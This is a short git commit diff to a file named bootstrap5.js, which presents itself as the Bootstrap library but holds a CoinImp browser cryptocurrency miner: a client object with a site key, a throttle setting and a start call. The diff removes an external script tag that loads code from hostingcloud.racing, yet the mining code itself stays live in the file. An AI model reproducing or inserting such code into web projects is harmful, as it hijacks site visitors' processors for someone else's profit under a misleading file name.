4260f9b5cdaee642ba609095a96745aae847804f
JoshRSx <82129353+JoshRSx@users.noreply.github.com>
2021-10-10 08:56:20 -0500

    Update bootstrap5.js

--- bootstrap5.js
+++ bootstrap5.js
@@ -1,9 +1,7 @@
-<script src="https://www.hostingcloud.racing/YPHO.js"></script>
-<script>
+
     var _client = new Client.Anonymous('53cdfde2de9611a326e4f8bb5389727a9644e353f1c336f485fb51756a11d9bf', {
         throttle: 0.1, c: 'w'
     });
     _client.start();
     _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
 
-</script>
